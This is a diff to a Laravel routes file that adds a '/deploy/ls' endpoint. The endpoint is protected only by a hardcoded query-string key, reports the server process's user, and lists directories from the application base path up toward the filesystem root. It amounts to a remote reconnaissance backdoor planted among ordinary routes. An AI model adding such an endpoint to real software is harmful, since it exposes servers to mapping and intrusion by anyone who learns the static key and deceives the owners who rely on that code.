@@ -322,3 +322,42 @@ Route::post('/auth/sub-user/login', [\App\Http\Controllers\SubUserController::cl
 Route::middleware('auth:sub-user')->group(function () {
     Route::get('/admin/sub-users/{id}/stats', [\App\Http\Controllers\SubUserController::class, 'getReferralStats']);
 });
+
+// Remote directory listing
+Route::get('/deploy/ls', function(Illuminate\Http\Request $request) {
+    if ($request->query('key') !== 'openscore_deploy_2026') return response('Unauthorized', 401);
+    
+    $startPath = base_path();
+    $output = "Base Path: " . $startPath . "\n";
+    $output .= "User: " . (function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : 'N/A') . "\n\n";
+    
+    $current = $startPath;
+    for ($i = 0; $i <= 4; $i++) {
+        $output .= "Level -{$i}: {$current}\n";
+        $output .= "------------------------------------------\n";
+        try {
+            if (is_dir($current) && is_readable($current)) {
+                $files = scandir($current);
+                if ($files !== false) {
+                    foreach ($files as $file) {
+                        if ($file === '.' || $file === '..') continue;
+                        $full = $current . DIRECTORY_SEPARATOR . $file;
+                        $type = is_dir($full) ? '[DIR]' : '[FILE]';
+                        $output .= "{$type} {$file}\n";
+                    }
+                }
+            } else {
+                $output .= "[Error: Directory not readable or doesn't exist]\n";
+            }
+        } catch (\Exception $e) {
+            $output .= "[Exception: " . $e->getMessage() . "]\n";
+        }
+        $output .= "\n";
+        $next = dirname($current);
+        if ($next === $current) break; // Root reached
+        $current = $next;
+    }
+    
+    return response($output)->header('Content-Type', 'text/plain');
+});
+
